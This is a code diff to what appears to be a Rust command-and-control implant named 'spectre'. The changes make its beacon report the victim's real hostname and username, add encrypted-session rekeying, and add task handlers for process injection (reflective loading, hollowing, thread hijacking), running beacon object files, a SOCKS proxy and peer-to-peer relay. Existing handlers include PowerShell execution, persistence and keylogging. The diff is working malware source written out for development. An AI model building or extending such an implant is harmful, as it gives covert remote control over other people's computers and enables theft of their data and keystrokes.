@@ -1,8 +1,16 @@
+#[cfg(not(target_os = "windows"))]
 use crate::utils::syscalls::*;
 use alloc::format;
 use alloc::vec::Vec;
 use serde::{Deserialize, Serialize};
 use snow::Builder;
+
+#[cfg(target_os = "windows")]
+use crate::utils::api_resolver::{hash_str, resolve_function};
+#[cfg(target_os = "windows")]
+use crate::utils::windows_definitions::{HANDLE, PVOID};
+#[cfg(target_os = "windows")]
+use core::ffi::c_void;
 
 pub mod packet;
 use packet::{WraithFrame, FRAME_TYPE_DATA};
@@ -163,9 +171,6 @@ impl HttpTransport {
 }
 
 #[cfg(target_os = "windows")]
-use crate::utils::api_resolver::{hash_str, resolve_function};
-
-#[cfg(target_os = "windows")]
 impl Transport for HttpTransport {
     fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
         let wininet_hash = hash_str(b"wininet.dll");
@@ -250,13 +255,33 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
     let _ = transport.request(&buf[..len]); 
 
     let mut session = noise.into_transport_mode().unwrap();
+    let mut packet_count: u64 = 0;
+    let mut last_rekey = 0; // Simplified time proxy
 
     loop {
-        let beacon_json = r#"{"id": "spectre", "hostname": "target", "username": "root"}"#;
+        // Check if rekey is needed (1M packets or time proxy)
+        // For MVP, we rekey every 100 check-ins or 1M packets
+        if packet_count >= 1_000_000 || last_rekey >= 100 {
+            let rekey_frame = WraithFrame::new(packet::FRAME_TYPE_REKEY, Vec::new());
+            let rb = rekey_frame.serialize();
+            let len = session.write_message(&rb, &mut buf).unwrap();
+            let _ = transport.request(&buf[..len]);
+            
+            session.rekey_outgoing();
+            packet_count = 0;
+            last_rekey = 0;
+        }
+
+        let hostname = crate::modules::discovery::Discovery.get_hostname();
+        let username = crate::modules::discovery::Discovery.get_username();
+        // Simple JSON construction without allocations if possible, but we have alloc
+        let beacon_json = format!(r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#, hostname, username);
+        
         let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
         let frame_bytes = frame.serialize();
 
         let len = session.write_message(&frame_bytes, &mut buf).unwrap();
+        packet_count += 1;
 
         if let Ok(resp) = transport.request(&buf[..len]) {
             let mut pt = [0u8; 8192];
@@ -266,6 +291,7 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
             }
         }
 
+        last_rekey += 1;
         crate::utils::obfuscation::sleep(config.sleep_interval);
     }
 }
@@ -284,12 +310,37 @@ struct TaskList {
     tasks: alloc::vec::Vec<Task>,
 }
 
+fn hex_decode(s: &str) -> Vec<u8> {
+    let mut res = Vec::new();
+    let chars: Vec<char> = s.chars().collect();
+    for i in (0..s.len()).step_by(2) {
+        if i + 1 < s.len() {
+            let byte_str = format!("{}{}", chars[i], chars[i+1]);
+            if let Ok(byte) = u8::from_str_radix(&byte_str, 16) {
+                res.push(byte);
+            }
+        }
+    }
+    res
+}
+
 fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &mut HttpTransport) {
+    // Check for Rekey Frame first (outer wrap)
+    if let Some(frame) = WraithFrame::deserialize(data) {
+        if frame.frame_type == packet::FRAME_TYPE_REKEY {
+            session.rekey_incoming();
+            return;
+        }
+    }
+
     let clean_data = if let Some(idx) = data.iter().position(|&x| x == 0) {
         &data[..idx]
     } else {
         data
     };
+
+    // Global SOCKS proxy instance (Simplified for no_std context)
+    static mut SOCKS_PROXY: Option<crate::modules::socks::SocksProxy> = None;
 
     if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
         for task in response.tasks {
@@ -302,6 +353,48 @@ fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &m
                 },
                 "powershell" => {
                     result = crate::modules::powershell::PowerShell.exec(&task.payload);
+                },
+                "inject" => {
+                    // Payload: "<pid> <method> <payload_hex>"
+                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
+                    if parts.len() == 3 {
+                        let pid = parts[0].parse::<u32>().unwrap_or(0);
+                        let method = match parts[1] {
+                            "reflective" => crate::modules::injection::InjectionType::Reflective,
+                            "hollowing" => crate::modules::injection::InjectionType::Hollowing,
+                            "hijack" => crate::modules::injection::InjectionType::ThreadHijack,
+                            _ => crate::modules::injection::InjectionType::Reflective,
+                        };
+                        let payload = hex_decode(parts[2]);
+                        let res = crate::modules::injection::Injector.inject(pid, &payload, method);
+                        result = if res.is_ok() { b"Injection successful".to_vec() } else { b"Injection failed".to_vec() };
+                    }
+                },
+                "bof" => {
+                    let bof_data = hex_decode(&task.payload);
+                    #[cfg(target_os = "windows")]
+                    {
+                        let loader = crate::modules::bof_loader::BofLoader::new(bof_data);
+                        if loader.load_and_run().is_ok() {
+                            result = loader.get_output();
+                        } else {
+                            result = b"BOF execution failed".to_vec();
+                        }
+                    }
+                    #[cfg(not(target_os = "windows"))]
+                    {
+                        let _ = bof_data;
+                        result = b"BOF only supported on Windows".to_vec();
+                    }
+                },
+                "socks" => {
+                    unsafe {
+                        if (*core::ptr::addr_of!(SOCKS_PROXY)).is_none() {
+                            *core::ptr::addr_of_mut!(SOCKS_PROXY) = Some(crate::modules::socks::SocksProxy::new());
+                        }
+                        let payload = hex_decode(&task.payload);
+                        result = (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut().unwrap().process(&payload);
+                    }
                 },
                 "persist" => {
                     // Expect payload: "method name path"
@@ -358,6 +451,14 @@ fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &m
                 },
                 "keylogger" => {
                     result = crate::modules::collection::Collection.keylogger_poll().into_bytes();
+                },
+                "mesh_relay" => {
+                    // Payload is a hex-encoded packet for a downstream beacon
+                    let packet = hex_decode(&task.payload);
+                    if let Some(proxy) = unsafe { (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut() } {
+                        // For MVP, we use the SOCKS proxy logic to relay P2P data if active
+                        result = proxy.process(&packet);
+                    }
                 },
                 _ => {
                     // Unknown task
